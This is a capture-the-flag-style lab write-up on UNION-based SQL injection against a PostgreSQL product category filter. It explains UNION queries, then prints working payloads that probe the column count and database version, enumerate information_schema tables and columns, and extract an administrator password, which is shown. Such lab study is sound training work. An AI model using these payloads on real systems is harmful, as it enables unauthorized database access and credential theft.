# Lab: SQL injection attack, listing the database contents on non-Oracle databases

## The Story

This lab contains a SQL injection vulnerability in the product category filter. When we choose a category to see the related products, here's what's happening behind the scenes:

- We send a GET request that triggers this SQL query:
  
  ```sql
   SELECT column1, column2 FROM products WHERE category = 'Tech gifts';
  ```

  
- This means we have direct access to the database - the query results are returned to the web application

- Our goal is to login as administrator, so we need to trick the database into showing us sensitive data alongside the product information

- We can combine SQL queries using UNION:

  ```sql
    SELECT a, b FROM table1 UNION SELECT c, d FROM table2;
  ```
Here's an example:

**users table:**

| id | username       |
|----|----------------|
| 1  | bear05         |
| 2  | administrator  |

**emails table:**

| id | email             |
|----|-------------------|
| 1  | bear05@mail.com   |
| 2  | admin@mail.com    |

**Query:**

```sql
SELECT username, id FROM users
UNION
SELECT email, id FROM emails;
```
**Result set:**

| column1          | id |
|------------------|----|
| bear05           | 1  |
| administrator    | 2  |
| bear05@mail.com  | 1  |
| admin@mail.com   | 2  |

## What to consider when crafting a SQL injection:

- **Number of columns** in the original query (we determined it's 2 columns using `' UNION SELECT null, null--`)
- **Data types** returned by the original query (both columns return string data in this lab)

## The Attack

### First, we check the database version to identify the DB type:

**Payload:** 
  ```sql
    ?category=Tech+gifts%27+UNION+SELECT+version(),+NULL--
  ```

**Result:** PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.4) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, 64-bit

**Conclusion:** We are targeting a PostgreSQL database.

### Now we enumerate tables:

   The goal here is to see all the table names so we can identify the one that contains usernames and passwords. In PostgreSQL, there is a     folder called _information_schema_ that stores metadata about the database. By querying it, we can discover what tables exist and what     columns those tables contain.

**Payload:** 
  ```sql
    ' UNION SELECT table_name, null FROM information_schema.tables--
  ```
  Among all the tables, we suspect users_nuhelf to be the one containing user credentials.

  Next step is to check the columns of this table to make sure it contains username and password, and confirm it’s the right one holding     the administrator credential:

**Payload:** 
  ```sql
    ' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='users_nuhelf'--
  ```

**Found columns:**
- `username_wfhktn`
- `password_vbtbdm`

Our guess was correct!

Extracted credentials:

**Payload:** 
  ```sql
    ' UNION SELECT username_wfhktn, password_vbtbdm FROM users_nuhelf--`
  ```

**Credentials found:**
- Administrator: zpmtwslvirovqqfmsu23
